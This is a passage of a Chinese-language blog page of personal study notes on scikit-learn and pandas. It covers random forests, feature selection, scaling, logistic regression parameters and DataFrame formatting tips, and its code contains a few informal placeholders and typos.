class="number">2</span>)</span><br><span class="line">regr_1.fit(X, y)</span><br><span class="line">y_1 = regr_1.predict(X_test)</span><br></pre></td></tr></table></figure><h3><span id="随机森林">随机森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">wine = load_wine()</span><br><span class="line">wine.data</span><br><span class="line">wine.target</span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data,wine.target,test_size=<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clf = DecisionTreeClassifier(random_state=0)</span></span><br><span class="line">rfc = RandomForestClassifier(random_state=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#clf = clf.fit(Xtrain,Ytrain)</span></span><br><span class="line">rfc = rfc.fit(Xtrain,Ytrain)</span><br><span class="line"><span class="comment">#score_c = clf.score(Xtest,Ytest)</span></span><br><span class="line">score_r = rfc.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#交叉验证：是数据集划分为n分，依次取每一份做测试集，每n-1份做训练集，多次训练模型以观测模型稳定性的方法</span></span><br><span class="line"></span><br><span class="line">rfc_l = []</span><br><span class="line">clf_l = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    rfc = RandomForestClassifier(n_estimators=<span class="number">25</span>)</span><br><span class="line">    rfc_s = cross_val_score(rfc,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    rfc_l.append(rfc_s)</span><br><span class="line">    clf = DecisionTreeClassifier()</span><br><span class="line">    clf_s = cross_val_score(clf,wine.data,wine.target,cv=<span class="number">10</span>).mean()</span><br><span class="line">    clf_l.append(clf_s)</span><br><span class="line">    </span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">11</span>),rfc_l,label = <span class="string">"Random Forest"</span>)</span><br><span class="line">plt.plot(range(<span class="number">1</span>,<span class="number">11</span>),clf_l,label = <span class="string">"Decision Tree"</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#是否有注意到，单个决策树的波动轨迹和随机森林一致？</span></span><br><span class="line"><span class="comment">#再次验证了我们之前提到的，单个决策树的准确率越高，随机森林的准确率也会越高</span></span><br></pre></td></tr></table></figure><ul><li>随机森林填充数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">X_missing_reg = X_missing.copy()</span><br><span class="line">sortindex = np.argsort(X_missing_reg.isnull().sum(axis=<span class="number">0</span>)).values</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sortindex:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构建我们的新特征矩阵和新标签</span></span><br><span class="line">    df = X_missing_reg</span><br><span class="line">    fillc = df.iloc[:,i]</span><br><span class="line">    df = pd.concat([df.iloc[:,df.columns != i],pd.DataFrame(y_full)],axis=<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在新特征矩阵中，对含有缺失值的列，进行0的填补</span></span><br><span class="line">    df_0 =SimpleImputer(missing_values=np.nan,</span><br><span class="line">                        strategy=<span class="string">'constant'</span>,fill_value=<span class="number">0</span>).fit_transform(df)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找出我们的训练集和测试集</span></span><br><span class="line">    Ytrain = fillc[fillc.notnull()]</span><br><span class="line">    Ytest = fillc[fillc.isnull()]</span><br><span class="line">    Xtrain = df_0[Ytrain.index,:]</span><br><span class="line">    Xtest = df_0[Ytest.index,:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#用随机森林回归来填补缺失值</span></span><br><span class="line">    rfc = RandomForestRegressor(n_estimators=<span class="number">100</span>)</span><br><span class="line">    rfc = rfc.fit(Xtrain, Ytrain)</span><br><span class="line">    Ypredict = rfc.predict(Xtest)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#将填补好的特征返回到我们的原始的特征矩阵中</span></span><br><span class="line">    X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),X_missing_reg.columns[i]] = Ypredict</span><br><span class="line">    <span class="comment"># X_missing_reg.loc[X_missing_reg.iloc[:,i].isnull(),i] = Ypredict 可能报错</span></span><br></pre></td></tr></table></figure><h3><span id="预处理">预处理</span></h3><h4><span id="方差过滤"><strong>方差过滤</strong></span></h4><p>比如一个特征本身的方差很小，就表示样本在这个特征上基本没有差异，可能特征中的大多数值都一样，甚至整个特征的取值都相同，那这个特征对于样本区分没有什么作用<strong>所以无论接下来的特征工程要做什么，都要优先消除方差为0的特征</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> VarianceThreshold</span><br><span class="line">selector = VarianceThreshold() <span class="comment">#实例化，不填参数默认方差为0</span></span><br><span class="line">X_var0 = selector.fit_transform(X) <span class="comment">#获取删除不合格特征之后的新特征矩阵</span></span><br><span class="line"><span class="comment"># 过滤一半的变量</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X_fsvar = VarianceThreshold(np.median(X.var().values)).fit_transform(X) X.var().values</span><br><span class="line">np.median(X.var().values)</span><br></pre></td></tr></table></figure><h4><span id="卡方过滤">卡方过滤</span></h4><p>专门针对离散型标签（即分类问题）的相关性过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier <span class="keyword">as</span> RFC</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> chi2</span><br><span class="line"><span class="comment">#假设在这里我一直我需要300个特征</span></span><br><span class="line">X_fschi = SelectKBest(chi2, k=<span class="number">300</span>).fit_transform(X_fsvar, y)</span><br><span class="line">X_fschi.shape</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br><span class="line"></span><br><span class="line">chivalue, pvalues_chi = chi2(X_fsvar,y)</span><br><span class="line"><span class="comment">#k取多少？我们想要消除所有p值大于设定值，比如0.05或0.01的特征：</span></span><br><span class="line">k = chivalue.shape[<span class="number">0</span>] - (pvalues_chi &gt; <span class="number">0.05</span>).sum()</span><br><span class="line">X_fschi = SelectKBest(chi2, k=填写具体的k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fschi,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="f检验只能检验线性关系">F检验（只能检验线性关系）</span></h4><p>它即可以做回归也可以做分类，因此包含<strong>feature_selection.f_classif</strong>（F检验分类）和<strong>feature_selection.f_regression</strong>（F检验回</p><p>归）两个类。其中F检验分类用于标签是离散型变量的数据，而F检验回归用于标签是连续型变量的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> f_classif</span><br><span class="line">F, pvalues_f = f_classif(X_fsvar,y) </span><br><span class="line">k = F.shape[<span class="number">0</span>] - (pvalues_f &gt; <span class="number">0.05</span>).sum()</span><br><span class="line">X_fsF = SelectKBest(f_classif, k=填写具体的k).fit_transform(X_fsvar, y)</span><br><span class="line">cross_val_score(RFC(n_estimators=<span class="number">10</span>,random_state=<span class="number">0</span>),X_fsF,y,cv=<span class="number">5</span>).mean()</span><br></pre></td></tr></table></figure><h4><span id="互信息法">互信息法</span></h4><h3><span id="特征工程">特征工程</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Normalization 归一化 一般来说将数据分部在0到1之间</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line">data = [[<span class="number">-1</span>, <span class="number">2</span>], [<span class="number">-0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = MinMaxScaler()</span><br><span class="line"><span class="comment"># scaler = MinMaxScaler(feature_range=[5,10])</span></span><br><span class="line">result_ = scaler.fit_transform(data) <span class="comment">#训练和导出结果一步达成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sklearn 里面处理标准化这些需要二维数组</span></span><br><span class="line"><span class="comment"># Standardization 标准化 将数据处理成标准正态分布形式</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">data = [[<span class="number">-1</span>, <span class="number">2</span>], [<span class="number">-0.5</span>, <span class="number">6</span>], [<span class="number">0</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">18</span>]]</span><br><span class="line">scaler = StandardScaler() <span class="comment">#实例化</span></span><br><span class="line">res = scaler.fit_transform(data) <span class="comment">#使用fit_transform(data)一步达成结果</span></span><br><span class="line">res.mean()</span><br><span class="line">res.std()</span><br></pre></td></tr></table></figure><h3><span id="数据预处理">数据预处理</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sklearn 里面处理标准化这些需要二维数组</span></span><br><span class="line">shape(<span class="number">-1</span>,<span class="number">1</span>) <span class="comment"># 变成一列</span></span><br><span class="line">shape(<span class="number">1</span>,<span class="number">-1</span>) <span class="comment"># 变成一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果数据自带索引，导入时需指定索引列</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r"C:\work\learnbetter\micro-class\week 3 Preprocessing\Narrativedata.csv"</span>,index_col=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 缺失数据处理</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">r"C:\work\learnbetter\micro-class\week 3 </span></span><br><span class="line"><span class="string">Preprocessing\Narrativedata.csv"</span>,index_col=<span class="number">0</span>)</span><br><span class="line">data.head()</span><br><span class="line">data.loc[:,<span class="string">"Age"</span>] = data.loc[:,<span class="string">"Age"</span>].fillna(data.loc[:,<span class="string">"Age"</span>].median())</span><br><span class="line"><span class="comment">#.fillna 在DataFrame里面直接进行填补</span></span><br><span class="line">data.dropna(axis=<span class="number">0</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#.dropna(axis=0)删除所有有缺失值的行，.dropna(axis=1)删除所有有缺失值的列</span></span><br><span class="line"><span class="comment">#参数inplace，为True表示在原数据集上进行修改，为False表示生成一个复制对象，不修改原数据，默认False</span></span><br><span class="line">                   </span><br><span class="line">                   </span><br><span class="line"><span class="comment"># sklearn只能处理数值型数据，因此要将标签转为数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line">y = data.iloc[:,<span class="number">-1</span>] <span class="comment">#要输入的是标签，不是特征矩阵，所以允许一维</span></span><br><span class="line">le = LabelEncoder() <span class="comment">#实例化</span></span><br><span class="line">label=le.fit_transform(y)</span><br><span class="line">data.iloc[:,<span class="number">-1</span>] = label <span class="comment">#让标签等于我们运行出来的结果</span></span><br></pre></td></tr></table></figure><h3><span id="逻辑回归">逻辑回归</span></h3><h3><span id="perceptrons">Perceptrons</span></h3><table><thead><tr><th>参数名称</th><th>参数取值</th><th>参数解释</th></tr></thead><tbody><tr><td>penalty</td><td>默认=None，即不加惩罚项，‘l2’（L2正则） or ‘l1’（L1正则） or ‘elasticnet’（混合正则）</td><td>惩罚项，加上惩罚项主要为了避免模型过拟合风险</td></tr><tr><td>alpha</td><td>默认=0.0001，取值为浮点数</td><td>如果penalty不为None，则正则化项需要乘上这个数</td></tr><tr><td>l1_ratio</td><td>默认=0.15，取值在[0,1]</td><td>一般只在penalty=elasticnet时用，当l1_ratio =0就是L2正则，当l1_ratio =1就是L1正则，当在(0,1)之间就是混合正则</td></tr><tr><td>fit_intercept</td><td>bool值，默认=True</td><td>是否对参数 截距项b进行估计，若为False则数据应是中心化的</td></tr><tr><td>max_iter</td><td>int整数，默认=1000</td><td>最大迭代次数，哪怕损失函数依旧大于0/</td></tr><tr><td>tol</td><td>float or None，默认=10^(-3)</td><td>迭代停止的标准。如果不为None，那么当loss-pre-loss&lt;tol的时候，就会停止迭代。因为当前迭代造成的损失函数下降太小了，迭代下去对loss影响不大了。</td></tr><tr><td>shuffle</td><td>bool值，默认=True</td><td>每轮训练后是否打乱数据</td></tr><tr><td>verbose</td><td>取值为整数，默认=0</td><td>verbose = 0 为不在标准输出流输出日志信息，verbose = 1 为输出进度条记录；verbose = 2 为每个epoch输出一行记录</td></tr><tr><td>eta0</td><td>取值双精度浮点型double，默认=1</td><td>学习率，决定梯度下降时每次参数变化的幅度</td></tr><tr><td>n_jobs</td><td>取值为 int or None，默认=None</td><td>在多分类时使用的CPU数量，默认为None（或1），若为-1则使用所有CPU</td></tr><tr><td>random_state</td><td>取值为int, RandomState instance or None，默认=None</td><td>当 shuffle =True时，用于打乱训练数据</td></tr><tr><td>n_iter_no_change</td><td>取值int，默认=5</td><td>在提前停止之前等待验证分数无改进的迭代次数，用于提前停止迭代</td></tr><tr><td>early_stopping</td><td>取值bool值，默认=False</td><td>当验证得分不再提高时是否设置提前停止来终止训练。若设置此项，当验证得分在n_iter_no_change轮内没有提升时提前停止训练</td></tr><tr><td>class_weight</td><td>取值为dict, {class_label: weight} 或者 “balanced”或者None，默认=None</td><td>用于拟合参数时，每一类的权重是多少。当为None时，所有类的权重为1，等权重；当为balanced时，某类的权重为该类频数的反比，当为字典时，则key为类的标签，值为对应的权重</td></tr><tr><td>warm_start</td><td>取值为bool，默认=False</td><td>若为True则调用前一次设置的参数，使用新设置的参数</td></tr></tbody></table><ul><li><p>eta0 学习率</p><p>类似于步长，步长太小收敛太慢，步长太长，反复横跳，无法收敛。</p></li></ul><h3><span id="logisticregression">LogisticRegression</span></h3><ul><li><p>penalty：惩罚项，str类型，可选参数为l1和l2，默认为l2。用于指定惩罚项中使用的规范。newton-cg、sag和lbfgs求解算法只支持L2规范。L1G规范假设的是模型的参数满足拉普拉斯分布，L2假设的模型参数满足高斯分布，所谓的范式就是加上对参数的约束，使得模型更不会过拟合(overfit)，但是如果要说是不是加了约束就会好，这个没有人能回答，只能说，加约束的情况下，理论上应该可以获得泛化能力更强的结果。</p></li><li><p>dual：对偶或原始方法，bool类型，默认为False。对偶方法只用在求解线性多核(liblinear)的L2惩罚项上。当样本数量&gt;样本特征的时候，dual通常设置为False。</p></li><li><p>tol：停止求解的标准，float类型，默认为1e-4。就是求解到多少的时候，停止，认为已经求出最优解。</p></li><li><p>c：正则化系数λ的倒数，float类型，默认为1.0。必须是正浮点型数。像SVM一样，越小的数值表示越强的正则化。</p></li><li><p>fit_intercept：是否存在截距或偏差，bool类型，默认为True。</p></li><li><p>intercept_scaling：仅在正则化项为”liblinear”，且fit_intercept设置为True时有用。float类型，默认为1。</p></li><li><p>class_weight：用于标示分类模型中各种类型的权重，可以是一个字典或者’balanced’字符串，默认为不输入，也就是不考虑权重，即为None。如果选择输入的话，可以选择balanced让类库自己计算类型权重，或者自己输入各个类型的权重。举个例子，比如对于0,1的二元模型，我们可以定义class_weight={0:0.9,1:0.1}，这样类型0的权重为90%，而类型1的权重为10%。如果class_weight选择balanced，那么类库会根据训练样本量来计算权重。某种类型样本量越多，则权重越低，样本量越少，则权重越高。当class_weight为balanced时，类权重计算方法如下：n_samples / (n_classes * np.bincount(y))。n_samples为样本数，n_classes为类别数量，np.bincount(y)会输出每个类的样本数，例如y=[1,0,0,1,1],则np.bincount(y)=[2,3]。<br>那么class_weight有什么作用呢？</p><p>在分类模型中，我们经常会遇到两类问题：<br>第一种是误分类的代价很高。比如对合法用户和非法用户进行分类，将非法用户分类为合法用户的代价很高，我们宁愿将合法用户分类为非法用户，这时可以人工再甄别，但是却不愿将非法用户分类为合法用户。这时，我们可以适当提高非法用户的权重。<br>第二种是样本是高度失衡的，比如我们有合法用户和非法用户的二元样本数据10000条，里面合法用户有9995条，非法用户只有5条，如果我们不考虑权重，则我们可以将所有的测试集都预测为合法用户，这样预测准确率理论上有99.95%，但是却没有任何意义。这时，我们可以选择balanced，让类库自动提高非法用户样本的权重。提高了某种分类的权重，相比不考虑权重，会有更多的样本分类划分到高权重的类别，从而可以解决上面两类问题。</p></li><li><p>random_state：随机数种子，int类型，可选参数，默认为无，仅在正则化优化算法为sag,liblinear时有用。</p></li><li><p>solver：优化算法选择参数，只有五个可选参数，即newton-cg,lbfgs,liblinear,sag,saga。默认为liblinear。solver参数决定了我们对逻辑回归损失函数的优化方法，有四种算法可以选择，分别是：</p></li><li><p>liblinear：使用了开源的liblinear库实现，内部使用了坐标轴下降法来迭代优化损失函数。</p></li><li><p>lbfgs：拟牛顿法的一种，利用损失函数二阶导数矩阵即海森矩阵来迭代优化损失函数。</p></li><li><p>newton-cg：也是牛顿法家族的一种，利用损失函数二阶导数矩阵即海森矩阵来迭代优化损失函数。</p></li><li><p>sag：即随机平均梯度下降，是梯度下降法的变种，和普通梯度下降法的区别是每次迭代仅仅用一部分的样本来计算梯度，适合于样本数据多的时候。</p></li><li><p>saga：线性收敛的随机优化算法的的变重。</p></li></ul><p>总结：<br>liblinear适用于小数据集，而sag和saga适用于大数据集因为速度更快。<br>对于多分类问题，只有newton-cg,sag,saga和lbfgs能够处理多项损失，而liblinear受限于一对剩余(OvR)。啥意思，就是用liblinear的时候，如果是多分类问题，得先把一种类别作为一个类别，剩余的所有类别作为另外一个类别。一次类推，遍历所有类别，进行分类。<br>newton-cg,sag和lbfgs这三种优化算法时都需要损失函数的一阶或者二阶连续导数，因此不能用于没有连续导数的L1正则化，只能用于L2正则化。而liblinear和saga通吃L1正则化和L2正则化。<br>同时，sag每次仅仅使用了部分样本进行梯度迭代，所以当样本量少的时候不要选择它，而如果样本量非常大，比如大于10万，sag是第一选择。但是sag不能用于L1正则化，所以当你有大量的样本，又需要L1正则化的话就要自己做取舍了。要么通过对样本采样来降低样本量，要么回到L2正则化。<br>从上面的描述，大家可能觉得，既然newton-cg, lbfgs和sag这么多限制，如果不是大样本，我们选择liblinear不就行了嘛！错，因为liblinear也有自己的弱点！我们知道，逻辑回归有二元逻辑回归和多元逻辑回归。对于多元逻辑回归常见的有one-vs-rest(OvR)和many-vs-many(MvM)两种。而MvM一般比OvR分类相对准确一些。郁闷的是liblinear只支持OvR，不支持MvM，这样如果我们需要相对精确的多元逻辑回归时，就不能选择liblinear了。也意味着如果我们需要相对精确的多元逻辑回归不能使用L1正则化了。<br>max_iter：算法收敛最大迭代次数，int类型，默认为10。仅在正则化优化算法为newton-cg, sag和lbfgs才有用，算法收敛的最大迭代次数。</p><ul><li><p>multi_class：分类方式选择参数，str类型，可选参数为ovr和multinomial，默认为ovr。ovr即前面提到的one-vs-rest(OvR)，而multinomial即前面提到的many-vs-many(MvM)。如果是二元逻辑回归，ovr和multinomial并没有任何区别，区别主要在多元逻辑回归上。</p></li><li><p>OvR和MvM有什么不同<em>？</em><br>OvR的思想很简单，无论你是多少元逻辑回归，我们都可以看做二元逻辑回归。具体做法是，对于第K类的分类决策，我们把所有第K类的样本作为正例，除了第K类样本以外的所有样本都作为负例，然后在上面做二元逻辑回归，得到第K类的分类模型。其他类的分类模型获得以此类推。<br>而MvM则相对复杂，这里举MvM的特例one-vs-one(OvO)作讲解。如果模型有T类，我们每次在所有的T类样本里面选择两类样本出来，不妨记为T1类和T2类，把所有的输出为T1和T2的样本放在一起，把T1作为正例，T2作为负例，进行二元逻辑回归，得到模型参数。我们一共需要T(T-1)/2次分类。<br>可以看出OvR相对简单，但分类效果相对略差（这里指大多数样本分布情况，某些样本分布下OvR可能更好）。而MvM分类相对精确，但是分类速度没有OvR快。如果选择了ovr，则4种损失函数的优化方法liblinear，newton-cg,lbfgs和sag都可以选择。但是如果选择了multinomial,则只能选择newton-cg, lbfgs和sag了。</p></li><li><p>verbose：日志冗长度，int类型。默认为0。就是不输出训练过程，1的时候偶尔输出结果，大于1，对于每个子模型都输出。</p></li><li><p>warm_start：热启动参数，bool类型。默认为False。如果为True，则下一次训练是以追加树的形式进行（重新使用上一次的调用作为初始化）。</p></li><li><p>n_jobs：并行数。int类型，默认为1。1的时候，用CPU的一个内核运行程序，2的时候，用CPU的2个内核运行程序。为-1的时候，用所有CPU的内核运行程序。</p></li></ul><h2><span id="做题遇到的">做题遇到的</span></h2><h3><span id="数据格式化map">数据格式化map</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 df2 的获奖时间格式化为 x月x日</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_format</span><span class="params">(x)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x.strftime(<span class="string">"%m月%d日"</span>)</span><br><span class="line"></span><br><span class="line">df2[<span class="string">'获奖时间'</span>] = df2[<span class="string">'获奖时间'</span>].map(time_format)</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">df2.获奖时间.map(<span class="keyword">lambda</span> x: x.strftime(<span class="string">'%m月%d日'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn_percentage</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'%.2f%%'</span> % (x * <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">q1_df[<span class="string">'AT_HOME'</span>]=q1_df[<span class="string">'AT_HOME'</span>].apply(turn_percentage)</span><br><span class="line">q1_df[<span class="string">'AT_HOME'</span>]=q1_df[<span class="string">'AT_HOME'</span>].map(<span class="keyword">lambda</span> x: <span class="string">"&#123;:.2%&#125;"</span>.format(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示小数</span></span><br><span class="line">pd.set_option(<span class="string">'precision'</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map传字典</span></span><br><span class="line">df1[<span class="string">'A'</span>] = df1[<span class="string">'A'</span>].map(&#123;<span class="string">'A0'</span>:<span class="string">'cat'</span>,<span class="string">'A3'</span>:<span class="string">'rabbit'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map ignore</span></span><br><span class="line">df1[<span class="string">'B'</span>] = df1[<span class="string">'B'</span>].map(<span class="keyword">lambda</span> x:<span class="string">f'<span class="subst">&#123;x&#125;</span> 今天关注了早起Python'</span>, na_action=<span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#applymap可以对整个 dataframe 工作，现在将 df1 的最后三列保留两位小数</span></span><br><span class="line"></span><br><span class="line">df1[[<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>]] = df1[[<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>]].applymap(<span class="keyword">lambda</span> x:format(x,<span class="string">'.2f'</span>))</span><br></pre></td></tr></table></figure><h3><span id="索引">索引</span></h3><ul><li><code>reset_index</code>用于将索引还原成默认值，即从0开始步长为1的数组。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q1_df[<span class="string">'rate'</span>] = [x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,len(q1_df[<span class="string">'AT_HOME'</span>])+<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># 如果索引不是默认</span></span><br><span class="line">q1_df.reset_index().set_index(q1_df[<span class="string">'rate'</span>])</span><br><span class="line"><span class="comment"># 如果是默认</span></span><br><span class="line">q1_df.set_index(q1_df[<span class="string">'rate'</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 删除索引</span></span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">'DATA_DATE'</span>])</span><br><span class="line"><span class="comment"># 修改索引名</span></span><br><span class="line">df.rename_axis([<span class="string">"行政区"</span>, <span class="string">"公司规模"</span>],inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="坐标轴显示百分比">坐标轴显示百分比</span></h3><ul><li>第一种方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> FuncFormatter</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_percent</span><span class="params">(temp, position)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'%1.0f'</span>%(<span class="number">100</span>*temp) + <span class="string">'%'</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br></pre></td></tr></table></figure><ul><li>推荐</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span 